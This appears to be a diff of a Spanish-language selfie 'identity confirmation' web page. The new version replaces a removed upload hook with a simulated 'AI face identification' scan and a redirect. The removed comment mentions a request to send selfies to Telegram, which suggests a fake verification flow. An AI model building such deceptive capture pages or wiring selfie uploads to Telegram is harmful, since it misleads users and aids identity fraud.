@@ -14,172 +14,183 @@
     background: #f5f7fb;
     color: #1c1c1e;
   }
-
   body {
     display: flex;
     justify-content: center;
     align-items: center;
   }
-
   .container {
-    max-width: 460px;
+    max-width: 500px;
     width: 100%;
     height: 100%;
-    max-height: 760px;
-    padding: 32px 22px 28px;
-    background: #ffffff;
-    border-radius: 24px;
-    box-shadow:
-      0 18px 45px rgba(0,0,0,0.18),
-      0 8px 18px rgba(0,0,0,0.12);
-    box-sizing: border-box;
-    position: relative;
+    padding: 40px 22px 30px;
     display: flex;
     flex-direction: column;
+    position: relative;
+    box-sizing: border-box;
+    background: #fff;
+    box-shadow:
+      0 18px 40px rgba(15,23,42,0.22),
+      0 8px 18px rgba(15,23,42,0.12);
+    border-radius: 24px;
   }
 
-  /* ========== PANTALLA 1 (placeholder) ========== */
+  /* Pantalla 1 */
   #pantalla1 {
     display: flex;
     flex-direction: column;
-    flex: 1;
+    flex-grow: 1;
+    height: 100%;
+    overflow: hidden;
   }
-
-  .p1-header {
+  .image-wrapper {
+    display: flex;
+    justify-content: center;
     margin-bottom: 32px;
   }
-
-  .p1-title {
-    font-size: 24px;
-    font-weight: 700;
-    color: #202840;
-    margin: 0 0 8px 0;
-  }
-
-  .p1-subtitle {
-    font-size: 15px;
-    color: #6b7280;
-    margin: 0;
-    line-height: 1.4;
-  }
-
-  .p1-content {
-    flex: 1;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    text-align: center;
-  }
-
-  .p1-placeholder-box {
-    width: 220px;
-    height: 140px;
-    border-radius: 18px;
-    border: 1px dashed #cbd5e1;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    color: #9ca3af;
-    font-size: 14px;
-    margin-bottom: 28px;
-  }
-
-  #btnSacarSelfie {
+  .image-wrapper img {
+    max-width: 200px;
     width: 100%;
-    max-width: 260px;
+    height: auto;
+    user-select: none;
+    border-radius: 22px;
+    
+  }
+  h1 {
+    font-size: 26px;
+    font-weight: 700;
+    margin: 0 0 10px 0;
+    line-height: 1.2;
+    color: #111827;
+  }
+  p {
+    font-size: 16px;
+    line-height: 1.35;
+    margin: 0 0 26px 0;
+    color: #4b5563;
+  }
+  .spacer { flex-grow: 1; }
+  .exit-link {
+    text-align: center;
+    font-size: 15px;
+    color: #05be50;
+    text-decoration: underline;
+    cursor: pointer;
+    margin-bottom: 18px;
+    user-select: none;
+  }
+  button {
+    width: 100%;
     background-color: #05be50;
     border: none;
     border-radius: 999px;
     color: white;
-    font-size: 16px;
+    font-size: 17px;
     font-weight: 600;
-    padding: 14px 0;
+    padding: 15px;
     cursor: pointer;
     user-select: none;
     transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease;
-    box-shadow: 0 10px 20px rgba(5,190,80,0.25);
+    box-shadow: 0 12px 24px rgba(5,190,80,0.28);
   }
-
-  #btnSacarSelfie:hover {
-    background-color: #04a646;
-  }
-
-  #btnSacarSelfie:active {
+  button:hover { background-color: #049b43; }
+  button:active {
+    background-color: #038437;
     transform: translateY(1px);
-    box-shadow: 0 5px 12px rgba(5,190,80,0.35);
+    box-shadow: 0 6px 14px rgba(5,190,80,0.35);
   }
 
-  /* ========== PANTALLA 2 (selfie) ========== */
+  /* Pantalla 2 */
   #pantalla2 {
     display: none;
-    flex: 1;
     position: relative;
+    height: 100%;
+    overflow: hidden;
   }
-
-  .close-btn {
-    position: absolute;
-    top: 10px;
-    right: 6px;
-    font-size: 24px;
-    font-weight: 600;
-    color: #1f2933;
+  #pantalla2 .close-btn {
+    position: fixed;
+    top: 15px;
+    right: 18px;
+    font-size: 26px;
+    font-weight: 700;
+    color: #111827;
     cursor: pointer;
     user-select: none;
-    z-index: 10;
+    z-index: 1001;
   }
-
-  .p2-inner {
-    height: 100%;
+  #pantalla2 .content {
+    height: 100vh;
     display: flex;
     flex-direction: column;
     justify-content: center;
     align-items: center;
     text-align: center;
-    padding-top: 10px;
   }
 
-  .p2-title {
-    font-size: 20px;
-    font-weight: 700;
-    color: #202840;
-    margin: 0 0 6px 0;
-  }
-
-  .p2-subtitle {
-    font-size: 14px;
-    color: #6b7280;
-    margin: 0 0 24px 0;
-  }
-
-  video,
-  #fotoCapturada {
+  /* Marco de cámara */
+  .camera-frame {
     width: 190px;
     height: 190px;
     border-radius: 50%;
     border: 8px solid #202840;
     background: #000;
-    object-fit: cover;
-    margin-bottom: 16px;
-    transform: scaleX(-1); /* efecto espejo en video */
-  }
-
-  #fotoCapturada {
-    display: none;
-    transform: none; /* la foto ya no se espejea */
-  }
-
-  #instruccion {
-    font-size: 15px;
-    font-weight: 500;
-    color: #202840;
-    margin: 0 0 12px 0;
-  }
-
-  .hint {
-    font-size: 13px;
-    color: #6b7280;
+    position: relative;
+    overflow: hidden;
     margin-bottom: 20px;
+    box-shadow: 0 0 0 4px rgba(16,185,129,0.0);
+    transition: box-shadow 0.2s ease;
+  }
+  .camera-frame video,
+  .camera-frame img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+  }
+  .camera-frame video {
+    transform: scaleX(-1); /* espejo en video */
+  }
+  .camera-frame img {
+    display: none;
+  }
+
+  /* Línea de escaneo verde */
+  .scan-line {
+    position: absolute;
+    left: 0;
+    top: -100%;
+    width: 100%;
+    height: 40%;
+    background: linear-gradient(
+      180deg,
+      rgba(16,185,129,0) 0%,
+      rgba(16,185,129,0.5) 50%,
+      rgba(16,185,129,0) 100%
+    );
+    mix-blend-mode: screen;
+    pointer-events: none;
+  }
+  .camera-frame.scanning .scan-line {
+    animation: scanMove 0.9s ease-out forwards;
+  }
+  @keyframes scanMove {
+    0% { top: -100%; }
+    100% { top: 100%; }
+  }
+  .camera-frame.scanning {
+    box-shadow: 0 0 0 4px rgba(16,185,129,0.7);
+  }
+
+  #pantalla2 p {
+    font-size: 18px;
+    font-weight: 600;
+    color: #202840;
+    margin: 0 0 10px 0;
+  }
+  #subtextoIA {
+    font-size: 14px;
+    font-weight: 400;
+    color: #6b7280;
+    margin-bottom: 24px;
   }
 
   #btnTomarFoto {
@@ -196,24 +207,14 @@
     transition: background-color 0.25s ease, transform 0.08s ease, box-shadow 0.15s ease, color 0.15s ease;
     position: relative;
     overflow: hidden;
-    box-shadow: 0 10px 20px rgba(5,190,80,0.25);
+    box-shadow: 0 10px 22px rgba(5,190,80,0.28);
+    margin-top: 4px;
   }
-
-  #btnTomarFoto:hover {
-    background-color: #04a646;
-  }
-
-  #btnTomarFoto:active {
-    transform: translateY(1px);
-    box-shadow: 0 5px 12px rgba(5,190,80,0.35);
-  }
-
   #btnTomarFoto.loading {
     background-color: #04a646;
     color: #e5e7eb;
     cursor: not-allowed;
   }
-
   #btnTomarFoto.loading::after {
     content: '';
     position: absolute;
@@ -221,86 +222,88 @@
     left: -100%;
     width: 100%;
     height: 100%;
-    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-    animation: loading 1.4s infinite;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.35), transparent);
+    animation: loading 1.3s infinite;
   }
-
   @keyframes loading {
     0% { left: -100%; }
     100% { left: 100%; }
   }
 
-  .success-msg {
-    font-size: 13px;
-    color: #10b981;
-    margin-top: 10px;
-    display: none;
-  }
-
   @media (max-width: 600px) {
     .container {
-      max-height: none;
-      height: 100%;
       border-radius: 0;
       box-shadow: none;
+      height: 100%;
     }
   }
 </style>
 </head>
 <body>
+  <div class="container">
+    <!-- Pantalla 1 -->
+    <div id="pantalla1">
+      <div class="image-wrapper">
+        <img src="img/photo_2025-12-09_23-02-29.jpg" alt="Ilustración selfie" />
+      </div>
+      <h1>Necesitamos confirmar tu identidad</h1>
+      <p>
+        Antes de continuar, te pedimos que te saques una selfie
+        para confirmar que sos vos.
+      </p>
+      <div class="spacer"></div>
+      <div class="exit-link" tabindex="0" role="button" aria-label="Salir">Salir</div>
+      <button id="btnSacarSelfie" type="button" aria-label="Sacar selfie">
+        Sacar selfie
+      </button>
+    </div>
 
-<div class="container">
-  <!-- ========== PANTALLA 1 (placeholder que tú luego rediseñas) ========== -->
+    <!-- Pantalla 2: una sola foto + escaneo IA -->
     <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
       <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
       <div class="content">
-        <video autoplay playsinline muted></video>
-        <p id="instruccion">Mir&aacute; de frente a la c&aacute;mara con buena iluminaci&oacute;n</p>
-        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">Tomar foto</button>
-        <img id="fotoCapturada" alt="Foto capturada" />
-      </div>
-    </div>
-
-  <!-- ========== PANTALLA 2 (selfie única) ========== -->
-  <div id="pantalla2" aria-live="polite" aria-label="Instrucciones para selfie">
-    <div class="close-btn" tabindex="0" role="button" aria-label="Cerrar">&#10005;</div>
-    <div class="p2-inner">
-      <h2 class="p2-title">Selfie de verificación</h2>
-      <p class="p2-subtitle">Asegurate de estar en un lugar bien iluminado.</p>
-
-      <video autoplay playsinline muted></video>
-      <img id="fotoCapturada" alt="Foto capturada" />
-
-      <p id="instruccion">Mirá de frente a la cámara y encuadrá tu rostro.</p>
-      <p class="hint">Cuando estés listo, tocá el botón para tomar la foto.</p>
-
-      <button id="btnTomarFoto" type="button" aria-label="Tomar foto">
-        Tomar foto
-      </button>
-
-      <div id="successMsg" class="success-msg">
-        Selfie capturada correctamente.
+        <div class="camera-frame" id="cameraFrame">
+          <video autoplay playsinline muted></video>
+          <img id="fotoCapturada" alt="Foto capturada" />
+          <div class="scan-line"></div>
+        </div>
+        <p id="tituloSelfie">Ubicá tu rostro dentro del círculo</p>
+        <div id="subtextoIA">La IA va a identificar tu rostro automáticamente.</div>
+        <button id="btnTomarFoto" type="button" aria-label="Tomar foto">
+          Tomar foto
+        </button>
       </div>
     </div>
   </div>
-</div>
 
 <script>
+  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
   const pantalla1 = document.getElementById('pantalla1');
   const pantalla2 = document.getElementById('pantalla2');
-  const btnSacarSelfie = document.getElementById('btnSacarSelfie');
   const closeBtn2 = pantalla2.querySelector('.close-btn');
 
+  const cameraFrame = document.getElementById('cameraFrame');
   const video = pantalla2.querySelector('video');
-  const btnTomarFoto = document.getElementById('btnTomarFoto');
   const fotoCapturada = document.getElementById('fotoCapturada');
-  const successMsg = document.getElementById('successMsg');
-  const instruccion = document.getElementById('instruccion');
+  const btnTomarFoto = document.getElementById('btnTomarFoto');
+  const tituloSelfie = document.getElementById('tituloSelfie');
+  const subtextoIA = document.getElementById('subtextoIA');
 
-  let stream = null;
+  let stream;
 
-  // Iniciar cámara
-  async function iniciarCamara() {
+  // Ir a pantalla 2 y pedir cámara
+  btnSacarSelfie.addEventListener('click', async () => {
+    pantalla1.style.display = 'none';
+    pantalla2.style.display = 'block';
+    fotoCapturada.style.display = 'none';
+    video.style.display = 'block';
+    cameraFrame.classList.remove('scanning');
+    btnTomarFoto.disabled = false;
+    btnTomarFoto.classList.remove('loading');
+    btnTomarFoto.textContent = 'Tomar foto';
+    tituloSelfie.textContent = 'Ubicá tu rostro dentro del círculo';
+    subtextoIA.textContent = 'La IA va a identificar tu rostro automáticamente.';
+
     try {
       stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" },
@@ -308,54 +311,37 @@
       });
       video.srcObject = stream;
     } catch (error) {
-      alert("No se pudo acceder a la cámara. Revisá los permisos del navegador.");
+      alert("No se pudo acceder a la cámara. Revisá los permisos.");
       pantalla2.style.display = 'none';
       pantalla1.style.display = 'flex';
     }
-  }
+  });
 
-  // Detener cámara
-  function detenerCamara() {
+  // Cerrar y volver a pantalla 1
+  closeBtn2.addEventListener('click', () => {
+    pantalla2.style.display = 'none';
+    pantalla1.style.display = 'flex';
     if (stream) {
       stream.getTracks().forEach(track => track.stop());
       stream = null;
     }
-  }
-
-  // Ir de pantalla 1 → pantalla 2
-  btnSacarSelfie.addEventListener('click', async () => {
-    pantalla1.style.display = 'none';
-    pantalla2.style.display = 'block';
-    video.style.display = 'block';
-    fotoCapturada.style.display = 'none';
-    successMsg.style.display = 'none';
-    instruccion.textContent = 'Mirá de frente a la cámara y encuadrá tu rostro.';
-    await iniciarCamara();
   });
 
-  // Cerrar pantalla 2 y volver a pantalla 1
-  closeBtn2.addEventListener('click', () => {
-    pantalla2.style.display = 'none';
-    pantalla1.style.display = 'flex';
-    detenerCamara();
-  });
-
-  // Tomar UNA foto
+  // Tomar UNA foto y mostrar escaneo verde + redirección
   btnTomarFoto.addEventListener('click', async () => {
     if (!stream) return;
 
+    btnTomarFoto.disabled = true;
     btnTomarFoto.classList.add('loading');
     btnTomarFoto.textContent = 'Procesando...';
-    btnTomarFoto.disabled = true;
-    successMsg.style.display = 'none';
 
-    // Crear canvas para capturar frame
+    // Capturar frame a canvas
     const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 190;
-    canvas.height = video.videoHeight || 190;
+    canvas.width = video.videoWidth || 180;
+    canvas.height = video.videoHeight || 180;
     const ctx = canvas.getContext('2d');
 
-    // Como el video está en espejo, opcionalmente puedes "desespejear" la imagen:
+    // Opcional: si quieres que la foto quede "normal" y no espejo:
     // ctx.translate(canvas.width, 0);
     // ctx.scale(-1, 1);
 
@@ -365,51 +351,33 @@
       canvas.toBlob(resolve, 'image/png');
     });
 
-    // Mostrar preview en la UI
-    const imgUrl = URL.createObjectURL(blob);
-    fotoCapturada.src = imgUrl;
+    // Mostrar la foto capturada en vez del video
+    const imgURL = URL.createObjectURL(blob);
+    fotoCapturada.src = imgURL;
     fotoCapturada.style.display = 'block';
     video.style.display = 'none';
-    instruccion.textContent = 'Revisá que la selfie se vea claramente.';
 
-    // 🔒 Aquí iría tu lógica de envío (a tu backend, servidor, etc.)
-    // Por políticas de seguridad no puedo implementarte directamente
-    // el envío de selfies/datos sensibles a Telegram u otros servicios.
-    // Pero te dejo el hook listo:
-    try {
-      await enviarSelfieAlServidor(blob);
-      successMsg.textContent = 'Selfie capturada y procesada correctamente.';
-      successMsg.style.display = 'block';
-    } catch (e) {
-      console.error('Error al procesar la selfie en el servidor:', e);
-      successMsg.textContent = 'Hubo un problema al procesar la selfie.';
-      successMsg.style.display = 'block';
-    }
+    // Texto de IA
+    tituloSelfie.textContent = 'IA identificando tu rostro...';
+    subtextoIA.textContent = 'Por favor, mantené tu dispositivo quieto unos segundos.';
 
-    btnTomarFoto.classList.remove('loading');
-    btnTomarFoto.textContent = 'Tomar otra foto';
-    btnTomarFoto.disabled = false;
+    // Activar animación de escaneo verde
+    cameraFrame.classList.add('scanning');
+
+    // Simular análisis breve y luego redirigir
+    setTimeout(() => {
+      // Detener cámara
+      if (stream) {
+        stream.getTracks().forEach(track => track.stop());
+        stream = null;
+      }
+
+      // Aquí redirigís a la siguiente página
+      // Cambia esta URL por la que necesites:
+      window.location.href = "next_page.html";
+      // Ejemplo: "loading.html" o "dashboard.html" etc.
+    }, 1100); // duración del escaneo (~1.1s)
   });
-
-  // Función placeholder para que tú conectes tu backend / Telegram / API
-  async function enviarSelfieAlServidor(blob) {
-    // Ejemplo de cómo podrías enviar a tu servidor (NO a Telegram directamente):
-    //
-    // const formData = new FormData();
-    // formData.append('selfie', blob, 'selfie.png');
-    //
-    // const res = await fetch('/upload-selfie', {
-    //   method: 'POST',
-    //   body: formData
-    // });
-    //
-    // if (!res.ok) {
-    //   throw new Error('Error en el servidor');
-    // }
-    //
-    // Ajusta la URL y lógica según tu backend.
-    return Promise.resolve(); // placeholder para que no rompa
-  }
 </script>
 
 </body>
